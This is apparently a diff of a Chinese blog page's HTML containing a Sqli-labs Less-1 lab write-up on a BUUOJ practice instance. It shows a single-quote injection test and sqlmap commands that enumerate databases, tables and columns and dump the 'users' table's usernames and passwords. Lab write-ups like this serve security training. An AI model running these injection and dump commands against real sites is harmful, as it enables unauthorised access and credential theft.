@@ -92,12 +92,12 @@
 
 
 
-<meta name="description" content="Sqlmap(kali linux)初步使用+手工注 Less-1sqlmap加单引号测试报错了，说明这里有注入点，上Sqlmap爆数据库名 1sqlmap -u &quot;http:&#x2F;&#x2F;f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs 爆出数据库名，在security数据库中，接下来根据数据库名爆表名 1sql">
+<meta name="description" content="Sqlmap(kali linux)初步使用+手工注 Less-1sqlmap加单引号测试报错了，说明这里有注入点，上Sqlmap爆数据库名1sqlmap -u &quot;http:&#x2F;&#x2F;f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs爆出数据库名，在security数据库中，接下来根据数据库名爆表名1sqlmap">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Sqli-labs">
 <meta property="og:url" content="http://www.zxfireworks.xyz/post/31b2abaa.html">
 <meta property="og:site_name" content="w1ndy">
-<meta property="og:description" content="Sqlmap(kali linux)初步使用+手工注 Less-1sqlmap加单引号测试报错了，说明这里有注入点，上Sqlmap爆数据库名 1sqlmap -u &quot;http:&#x2F;&#x2F;f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs 爆出数据库名，在security数据库中，接下来根据数据库名爆表名 1sql">
+<meta property="og:description" content="Sqlmap(kali linux)初步使用+手工注 Less-1sqlmap加单引号测试报错了，说明这里有注入点，上Sqlmap爆数据库名1sqlmap -u &quot;http:&#x2F;&#x2F;f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs爆出数据库名，在security数据库中，接下来根据数据库名爆表名1sqlmap">
 <meta property="og:image" content="http://q63cs67co.bkt.clouddn.com/less1_1.PNG">
 <meta property="og:image" content="http://q63cs67co.bkt.clouddn.com/less1_2.PNG">
 <meta property="og:image" content="http://q63cs67co.bkt.clouddn.com/less1_3.PNG">
@@ -416,15 +416,7 @@
 
       
         <p>Sqlmap(kali linux)初步使用+手工注</p>
-<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><img src="http://q63cs67co.bkt.clouddn.com/less1_1.PNG" alt=""><br>加单引号测试<br><img src="http://q63cs67co.bkt.clouddn.com/less1_2.PNG" alt=""><br>报错了，说明这里有注入点，上Sqlmap<br>爆数据库名</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> --dbs</span><br></pre></td></tr></table></figure>
-<p><img src="http://q63cs67co.bkt.clouddn.com/less1_3.PNG" alt=""><br>爆出数据库名，在security数据库中，接下来根据数据库名爆表名</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> -D security --tables</span><br></pre></td></tr></table></figure>
-<p><img src="http://q63cs67co.bkt.clouddn.com/less1_4.PNG" alt=""><br>爆出表名users,根据表名爆出字段</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> -D security -T users --columns</span><br></pre></td></tr></table></figure>
-<p><img src="http://q63cs67co.bkt.clouddn.com/less1_5.PNG" alt=""><br>爆出字段名后，即可爆出字段值</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> -D security -T users -C <span class="string">"id,password,username"</span> --dump</span><br></pre></td></tr></table></figure>
-<p><img src="http://q63cs67co.bkt.clouddn.com/less1_6.PNG" alt=""></p>
+<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><img src="http://q63cs67co.bkt.clouddn.com/less1_1.PNG" alt=""><br>加单引号测试<br><img src="http://q63cs67co.bkt.clouddn.com/less1_2.PNG" alt=""><br>报错了，说明这里有注入点，上Sqlmap<br>爆数据库名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> --dbs</span><br></pre></td></tr></table></figure><br><img src="http://q63cs67co.bkt.clouddn.com/less1_3.PNG" alt=""><br>爆出数据库名，在security数据库中，接下来根据数据库名爆表名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> -D security --tables</span><br></pre></td></tr></table></figure><br><img src="http://q63cs67co.bkt.clouddn.com/less1_4.PNG" alt=""><br>爆出表名users,根据表名爆出字段<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> -D security -T users --columns</span><br></pre></td></tr></table></figure><br><img src="http://q63cs67co.bkt.clouddn.com/less1_5.PNG" alt=""><br>爆出字段名后，即可爆出字段值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> -D security -T users -C <span class="string">"id,password,username"</span> --dump</span><br></pre></td></tr></table></figure><br><img src="http://q63cs67co.bkt.clouddn.com/less1_6.PNG" alt=""></p>
 <h3 id="手工注"><a href="#手工注" class="headerlink" title="手工注"></a>手工注</h3><p><img src="http://q63cs67co.bkt.clouddn.com/less1_8.jpg" alt=""><br>没有问题<br><img src="http://q63cs67co.bkt.clouddn.com/less1_7.jpg" alt=""><br>报错，说明是单引号注入</p>
 <h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2>
       
